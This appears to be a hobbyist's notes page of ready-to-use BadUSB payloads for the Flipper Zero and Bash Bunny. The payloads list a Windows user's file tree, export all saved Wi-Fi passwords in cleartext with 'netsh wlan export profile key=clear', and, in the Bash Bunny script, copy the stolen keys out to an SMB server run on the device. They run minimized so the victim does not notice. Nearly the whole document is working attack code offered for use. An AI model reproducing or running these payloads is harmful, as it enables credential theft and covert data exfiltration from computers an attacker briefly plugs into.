# BadUSB:

### Flipper Zero:

#### File Tree:

- Requires external USB drive to save results to
- I found a different badusb script, but thought I could do better

```ruby
DEFAULTDELAY 250
DELAY 3000
GUI r
DELAY 400
STRING cmd.exe
DELAY 500
ENTER
DELAY 800
STRING For %g In (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z)Do @Vol %g: 2>NUL|%__AppDir__%find.exe /I "RedCabbage" > NUL && set DRIVE=%g
DELAY 800
ENTER
DELAY 200
STRING FOR /F "tokens=*" %h IN ('hostname') do (SET VAR=%h) && set FOLDER="%DRIVE%:\\treeofknowledge\\" && SET HOSTNAME="%h"
DELAY 200
ENTER
DELAY 200
STRING if not exist "%FOLDER%" mkdir "%FOLDER%"
DELAY 800
ENTER
DELAY 500
STRING cd /d "%FOLDER%"
DELAY 800
ENTER
DELAY 500
STRING tree /a /f %USERPROFILE% >> "%HOSTNAME%".txt && exit
ENTER
ALT SPACE
STRING n
```

----------------

#### Get Wifi-Passwords

- Requires external USB drive to save results to
- This just gets all the wifi passwords saved on a Windows computer

```ruby
GUI r
DELAY 500
STRING cmd.exe
DELAY 500
ENTER
DELAY 800
STRING For %g In (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z)Do @Vol %g: 2>NUL|%__AppDir__%find.exe /I "RedCabbage" > NUL && set DRIVE=%g
DELAY 800
ENTER
DELAY 200
STRING FOR /F "tokens=*" %h IN ('hostname') do (SET VAR=%h) && set FOLDER="%DRIVE%:\\networks\\%h"
DELAY 200
ENTER
DELAY 200
STRING if not exist "%FOLDER%" mkdir "%FOLDER%"
DELAY 800
ENTER
DELAY 500
STRING cd /d "%FOLDER%"
DELAY 800
ENTER
DELAY 500
STRING netsh wlan export profile key=clear && exit
DELAY 500
ENTER
ALT SPACE
STRING n
```

----------------

### Bash Bunny:

Link: https://shop.hak5.org/products/bash-bunny

------

- Overpriced board that runs a full Linux distro and can run scripts like a rubber ducky
- Pretty good for what it is, but documentation is not that great
- Payload library: https://github.com/hak5/bashbunny-payloads

SMB Payload:
------

- Built off of the script I found on a github repo (I think it was the official payloads repo by hak5)

```ruby
#!/bin/bash
#
# Title:         SMB File Transfer
# Author:        Alex
# Version:       1.1
# Category:      Exfiltration/Remote access
# Target:        Windows (Tested on Windows 10)
# Attackmodes:   HID, Ethernet
#
# REQUIREMENTS
# ============
# Needs impacket to be copied to /tools/impacket and installed
# Option A:
#   1. Download impacket from https://github.com/CoreSecurity/impacket
#   2. Copy impacket folder to /tools on the Bash Bunny flash drive
#   3. Boot Bash Bunny into arming mode and connect to console via serial
#   4. Issue "python /tools/impacket/setup.py install"
# Option B:
#   1. Download impacket deb package 
#   2. Copy impacket.deb to /tools on the Bash Bunny flash drive
#   3. Boot Bash Bunny into arming mode. Impacket will install automatically. 

# Initilization	
LED SETUP
ATTACKMODE HID RNDIS_ETHERNET

# set lootdir on disk
LOOTDIR=/root/udisk/loot/smb

# get all the required information via convenient variables
GET TARGET_HOSTNAME
GET TARGET_IP
GET HOST_IP

HOST=${TARGET_HOSTNAME}
# If hostname is blank set it to "noname"
[[ -z "$HOST" ]] && HOST="noname"
COUNT=$(ls -lad $LOOTDIR/$HOST* | wc -l)
COUNT=$((COUNT+1))
mkdir -p $LOOTDIR/$HOST-$COUNT
mkdir /tmp/networks

# Start the SMB Server
python /tools/impacket/examples/smbserver.py -smb2support 'Documents' '/tmp' >> $LOOTDIR/$HOST-$COUNT/smbserver.log &

# HID
LED Y SINGLE
RUN WIN cmd.exe /minimized /c "net use \\\\$HOST_IP\Documents\Policy.docx && exit"
Q ENTER
Q DELAY 1000

RUN WIN cmd.exe /minimized /c "mkdir %temp%\\networks\\ && cd %temp%\\networks\\ && netsh wlan export profile key=clear && exit"
Q ENTER
Q DELAY 1000

RUN WIN cmd.exe /minimized /c "robocopy %temp%\\networks\\ "\\\\$HOST_IP\\Documents\\networks\\""
Q ENTER
Q DELAY 3000

# copy logs to loot directory
cp logs/* /root/loot/smb/$HOST-$COUNT
cp logs/* $LOOTDIR/$HOST-$COUNT

mv /tmp/networks /root/loot/smb/$HOST-$COUNT
mv /tmp/networks  $LOOTDIR/$HOST-$COUNT


# Sync USB disk filesystem
sync

LED FINISH
```
